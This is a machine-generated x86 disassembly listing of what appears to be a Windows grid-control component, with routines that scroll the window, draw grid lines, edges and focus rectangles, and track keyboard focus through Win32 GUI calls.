cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax - 0x4 ] 0x0
jge r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x10 ]
call sub_470308
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
imul esi
mov [ ebp - 0x8 ] eax
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edx [ ebp + 0xc ]
cmp eax [ edx - 0x8 ]
jl r-xdata
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0xc ]
mov edx [ eax - 0x8 ]
mov eax ebx
call sub_470614
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0xc ]
sub eax [ ecx - 0x4 ]
dec eax
sub eax edx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471403
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
mov eax [ ebp + 0xc ]
cmp [ eax - 0x4 ] 0x0
jge r-xdata
cmp [ ebx ] 0x0
je r-xdata
inc eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0xc ]
sub eax [ edx - 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov ecx [ ebx ]
mov ecx [ ecx + edx * 4 ]
add [ ebp - 0x8 ] ecx
inc edx
dec eax
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
sub_471410
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x228 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x22c ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x21c ]
mov [ ebp - 0x18 ] eax
mov edx [ ebx + 0x24c ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebx + 0x238 ]
mov [ ebp - 0x2c ] ecx
dec eax
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x23c ]
mov [ ebp - 0x28 ] eax
dec edx
mov [ ebp - 0x20 ] edx
xor edi edi
xor eax eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x4 ]
test esi esi
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
neg esi
push ebp
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebx + 0x220 ]
lea eax [ ebx + 0x21c ]
mov ecx [ ebx + 0x230 ]
call sub_4712f0
pop ecx
mov edi eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2c ] eax
add esi [ ebp - 0x8 ]
mov eax [ ebx + 0x258 ]
cmp esi eax
jg r-xdata
push ebp
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebx + 0x250 ]
lea eax [ ebx + 0x24c ]
mov ecx [ ebx + 0x234 ]
call sub_4712f0
pop ecx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
add esi [ ebp - 0x8 ]
mov eax [ ebx + 0x25c ]
cmp esi eax
jg r-xdata
push 0x1
lea ecx [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
mov eax ebx
call sub_4735dc
lea eax [ ebp - 0x3c ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
dec eax
mov [ ebp - 0x24 ] eax
dec eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax ebx
mov si 0xffa8
call sub_403450
mov eax [ ebp - 0x10 ]
cmp eax [ ebx + 0x228 ]
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push edi
mov eax ebx
call sub_4507d8
push eax
call ScrollWindow
mov eax ebx
call sub_4507d8
push eax
call UpdateWindow
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx eax
mov eax ebx
call sub_473e20
mov edx [ ebp - 0xc ]
cmp edx [ ebx + 0x22c ]
je r-xdata
sub_471574
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov esi eax
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_4735dc
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_4715c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_471574
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4715f8
push ebx
mov ebx eax
mov ax [ ebx + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ ebx + 0x28d ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_450adc
test al al
je r-xdata
test [ ebx + 0x249 ] 0x20
jne r-xdata
mov al 0x1
pop ebx
retn
mov eax ebx
call sub_471654
test al al
jne r-xdata
sub_471654
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_461dc8
test eax eax
je r-xdata
call GetFocus
mov edi eax
jmp r-xdata
cmp esi [ eax + 0x220 ]
jne r-xdata
push edi
call IsWindow
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
jmp r-xdata
test bl bl
je r-xdata
cmp edi [ esi + 0x180 ]
jne r-xdata
push edi
call GetParent
mov edi eax
mov bl 0x1
jmp r-xdata
sub_4716f4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_4716e4
mov esi [ edi + 0x27c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0x102
mov eax esi
call sub_4507d8
push eax
call PostMessageA
sub_471748
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_41e454
mov ebx [ edi + 0x21c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_41e45c
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax ebp
call sub_41e3a4
mov ecx eax
mov edx esi
mov eax edi
call sub_475948
inc esi
dec ebx
jne r-xdata
sub_471788
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_41e454
mov ebx [ edi + 0x24c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_41e45c
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax ebp
call sub_41e3a4
mov ecx eax
mov edx esi
mov eax edi
call sub_475cb8
inc esi
dec ebx
jne r-xdata
sub_4717c8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_41fca0
mov ebx [ edi + 0x21c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_41fca8
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_475828
mov edx eax
mov eax ebp
call sub_41fc2c
inc esi
dec ebx
jne r-xdata
sub_471808
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_41fca0
mov ebx [ edi + 0x24c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_41fca8
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_475848
mov edx eax
mov eax ebp
call sub_41fc2c
inc esi
dec ebx
jne r-xdata
sub_471848
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x220 ] 0x0
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x220 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x220 ]
call sub_470778
xor al 0x1
pop ebx
pop ebp
retn
sub_47188c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x250 ] 0x0
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x250 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x250 ]
call sub_470778
xor al 0x1
pop ebx
pop ebp
retn
sub_4718d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44dae0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x28f ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
push eax
push sub_471748
mov eax [ ebp - 0x8 ]
push eax
push sub_4717c8
push ebp
call sub_471848
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x8 ]
push eax
push sub_471788
mov eax [ ebp - 0x8 ]
push eax
push sub_471808
push ebp
call sub_47188c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_471974
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x0
je r-xdata
push edi
lea edx [ ebx + 0x228 ]
mov ecx esi
mov eax ebx
call sub_473d64
push edi
lea edx [ ebx + 0x210 ]
mov ecx esi
mov eax ebx
call sub_473d64
push edi
lea edx [ ebx + 0x280 ]
mov ecx esi
mov eax ebx
call sub_473d64
xor eax eax
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_4758b8
mov [ esp + 0xc ] eax
cmp edi esi
jle r-xdata
lea ecx [ edi + 0x1 ]
lea ebp [ esi + 0x1 ]
mov edx ebp
lea eax [ ebx + 0x220 ]
call sub_470720
lea ecx [ edi + 0x1 ]
mov edx ebp
lea eax [ ebx + 0x224 ]
call sub_470720
mov [ esp ] edi
mov [ esp + 0x8 ] esi
mov [ esp ] esi
mov [ esp + 0x8 ] edi
jmp r-xdata
mov eax ebx
call sub_475e54
mov eax ebx
mov si 0xffa5
call sub_403450
mov edx esp
mov eax ebx
call sub_473758
mov ecx edi
mov edx esi
mov eax ebx
mov si 0xffaa
call sub_403450
cmp [ ebx + 0x220 ] 0x0
je r-xdata
sub_471a4c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
lea edx [ ebx + 0x22c ]
mov ecx esi
mov eax ebx
call sub_473d64
push edi
lea edx [ ebx + 0x214 ]
mov ecx esi
mov eax ebx
call sub_473d64
push edi
lea edx [ ebx + 0x284 ]
mov ecx esi
mov eax ebx
call sub_473d64
mov ecx edi
mov edx esi
mov eax ebx
mov si 0xffa9
call sub_403450
cmp [ ebx + 0x250 ] 0x0
je r-xdata
lea ecx [ edi + 0x1 ]
lea edx [ esi + 0x1 ]
lea eax [ ebx + 0x250 ]
call sub_470720
mov eax ebx
call sub_475e54
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffa4
call sub_403450
sub_471adc
push ebx
push esi
push edi
add esp 0xffffff90
mov edi ecx
mov esi edx
mov ebx eax
mov al [ ebx + 0x28e ]
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
cmp [ esp ] 0x0
setne al
add esp 0x70
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_4727b4
push esp
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xcc ]
sub_471b34
push ebx
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x28d ] 0x0
je r-xdata
add esp 0x10
pop ebx
retn
cmp [ ebx + 0x27c ] 0x0
je r-xdata
push esp
mov ecx [ ebx + 0x22c ]
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_4715c4
mov edx esp
mov eax [ ebx + 0x27c ]
call sub_471080
sub_471b80
pop ecx
mov edx esp
add eax 0x3
and eax 0xfffffffc
cmp eax 0xffc
jle r-xdata
sub esp eax
mov eax esp
push edx
mov edx esp
sub edx 0x4
push edx
push ecx
retn
sub esp 0xffc
push eax
sub eax 0x1000
jns r-xdata
add eax 0x1000
sub_471bc8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x208 ]
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x244 ]
mov eax [ esi + 0x10 ]
call sub_423ac0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ esi + 0x10 ]
call sub_423994
mov eax [ ebp + 0xc ]
mov edx [ eax + 0xc ]
mov eax [ esi + 0x10 ]
call sub_423994
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x10 ] eax
mov edx edi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov edx [ edx + ecx * 4 ]
mov ecx [ ebx ]
shr ecx 0x1
add edx ecx
add eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403450
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x2c ] eax
mov eax [ esi + 0x10 ]
call sub_42398c
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov eax [ esi + 0x10 ]
call sub_423ab8
push eax
push 0x12200
call ExtCreatePen
mov edx eax
mov eax [ esi + 0x10 ]
call sub_423a54
mov eax [ esi + 0x10 ]
call sub_423ab8
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
xor eax 0x1
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov edx [ edx + eax * 4 ]
mov [ ebp - 0x18 ] edx
add eax 0x2
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov eax [ edx + eax * 4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x2
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov eax [ edx + eax * 4 ]
add eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0xc ]
shl eax 0x2
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x14 ]
jg r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
shr eax 0x2
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x10 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_424598
push eax
call PolyPolyline
cmp edi [ ebx + 0x10 ]
jg r-xdata
inc edi
mov edx edi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
test eax eax
jg r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x4 ]
xor eax 0x1
mov edx eax
add edx [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
mov [ ecx + edx * 4 ] esi
add [ ebp - 0xc ] 0x2
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x8 ]
mov [ ecx + edx * 4 ] esi
add eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
mov [ edx + eax * 4 ] ecx
add [ ebp - 0xc ] 0x2
sub_471db0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
mov eax [ eax ]
mov edx [ ebp + 0x14 ]
cmp eax [ edx + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp + 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x14 ]
cmp eax [ edx + 0xc ]
je r-xdata
test bl bl
jne r-xdata
push ebp
mov al [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x1c ]
add eax 0xffffff90
xor ecx ecx
mov edx esi
call sub_471bc8
pop ecx
push ebp
push ebx
mov eax [ ebp + 0x1c ]
add eax 0xffffffc0
mov ecx 0x1
mov edx edi
call sub_471bc8
pop ecx
push ebp
push ebx
mov eax [ ebp + 0x1c ]
add eax 0xffffffc0
mov ecx 0x1
mov edx edi
call sub_471bc8
pop ecx
push ebp
mov al [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x1c ]
add eax 0xffffff90
xor ecx ecx
mov edx esi
call sub_471bc8
pop ecx
jmp r-xdata
sub_471e40
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x1c ]
add ebx 0xfffffffc
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x29 ] eax
jmp r-xdata
mov eax [ ebp - 0x29 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebx ]
mov eax [ eax + 0x24c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
mov edi [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2d ] eax
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
call sub_475848
add eax [ ebp - 0x29 ]
mov [ ebp - 0x21 ] eax
jmp r-xdata
mov eax [ ebp - 0x2d ]
cmp eax [ ebp + 0x14 ]
jge r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x40 ]
add eax [ ebp - 0x21 ]
mov [ ebp - 0x29 ] eax
inc [ ebp - 0xc ]
mov eax [ ebx ]
cmp edi [ eax + 0x21c ]
jl r-xdata
mov eax [ ebx ]
mov edx edi
call sub_475828
add eax [ ebp - 0x2d ]
mov [ ebp - 0x25 ] eax
mov eax [ ebp - 0x25 ]
cmp eax [ ebp - 0x2d ]
jle r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x70 ]
add eax [ ebp - 0x25 ]
mov [ ebp - 0x2d ] eax
inc edi
lea eax [ ebp - 0x2d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_424598
push eax
call RectVisible
test eax eax
je r-xdata
mov al [ ebp + 0x8 ]
mov [ ebp - 0xd ] al
mov eax [ ebx ]
call sub_471654
test al al
je r-xdata
mov eax [ ebp + 0x1c ]
lea ecx [ eax - 0x80 ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_470388
test al al
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x22c ]
cmp eax [ ebp - 0xc ]
jne r-xdata
test [ ebp - 0xd ] 0x2
je r-xdata
or [ ebp - 0xd ] 0x1
mov eax [ ebx ]
cmp edi [ eax + 0x228 ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
jne r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x4
je r-xdata
or [ ebp - 0xd ] 0x2
mov eax [ ebx ]
mov esi [ eax + 0x208 ]
mov eax [ ebx ]
mov edx [ eax + 0x68 ]
mov eax esi
call sub_424494
test [ ebp - 0xd ] 0x1
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28d ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_423c94
test [ ebp - 0xd ] 0x2
je r-xdata
lea eax [ ebp - 0x2d ]
push eax
mov al [ ebp - 0xd ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
test [ ebp - 0xd ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov edx 0xff00000d
call sub_423c94
mov eax [ esi + 0xc ]
mov edx 0xff00000e
call sub_4234a8
jmp r-xdata
mov eax [ ebx ]
mov ax [ eax + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x1a5 ] 0x0
je r-xdata
lea edx [ ebp - 0x2d ]
mov eax esi
call sub_4240b4
test [ ebp - 0xd ] 0x2
je r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x84 ]
mov edx [ ebp + 0x1c ]
or eax [ edx - 0x88 ]
je r-xdata
mov eax [ ebx ]
mov ax [ eax + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
push edi
lea esi [ ebp - 0x2d ]
lea edi [ ebp - 0x3d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp + 0x1c ]
test [ eax - 0x84 ] 0x4
jne r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ ebp + 0x1c ]
test [ eax - 0x84 ] 0x8
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x70 ]
add [ ebp - 0x35 ] eax
jmp r-xdata
mov eax [ ebx ]
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x84 ]
push eax
push 0x4
lea eax [ ebp - 0x3d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_424598
push eax
call DrawEdge
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x88 ]
push eax
push 0x4
lea eax [ ebp - 0x3d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_424598
push eax
call DrawEdge
mov eax [ ebp + 0x1c ]
mov eax [ eax - 0x40 ]
add [ ebp - 0x31 ] eax
push edi
lea esi [ ebp - 0x2d ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x25 ]
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x1d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_424598
push eax
call DrawFocusRect
lea eax [ ebp - 0x2d ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_424598
push eax
call DrawFocusRect
jmp r-xdata
sub_472176
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff38
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
lea edi [ ebp - 0x70 ]
mov eax [ ebx ]
mov si 0xffc8
call sub_403450
test al al
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_424574
mov edx edi
mov eax [ ebx ]
call sub_4727b4
cmp [ edi ] 0x0
jg r-xdata
mov dl 0x1
mov eax [ ebx ]
call sub_472ca0
mov esi 0xc0c0c0
mov eax [ ebx ]
mov edx [ edi + 0x40 ]
sub edx [ eax + 0x25c ]
mov eax [ ebx ]
add edx [ eax + 0x23c ]
mov eax [ ebx ]
push [ eax + 0x258 ]
mov eax [ edi + 0x10 ]
pop ecx
sub eax ecx
mov ecx [ ebx ]
add eax [ ecx + 0x238 ]
call sub_42b20c
add eax 0x3
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
shl eax 0x3
add eax eax
call sub_471b80
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_471b80
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov ecx 0x2
mov edx [ ebp - 0xc ]
call sub_471b74
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
call sub_422fe8
cmp eax 0xc0c0c0
jne r-xdata
cmp [ edi + 0x30 ] 0x0
jle r-xdata
push ebp
push 0x0
xor eax eax
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
xor ecx ecx
call sub_471db0
pop ecx
push ebp
push 0x0
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc8 ] eax
xor eax eax
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
mov ecx [ ebx ]
mov ecx [ ecx + 0x258 ]
call sub_471db0
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
push eax
xor eax eax
mov [ ebp - 0xc8 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x38 ]
mov [ ebp - 0xbc ] eax
lea eax [ ebp - 0xc8 ]
push eax
push 0x3
push 0x0
mov eax [ ebx ]
mov eax [ eax + 0x240 ]
push eax
mov eax [ ebx ]
test [ eax + 0x248 ] 0x1
setne dl
mov eax [ ebx ]
test [ eax + 0x248 ] 0x2
setne al
xor ecx ecx
call sub_471db0
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc8 ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0xc4 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0xc0 ] eax
mov eax [ edi + 0x38 ]
mov [ ebp - 0xbc ] eax
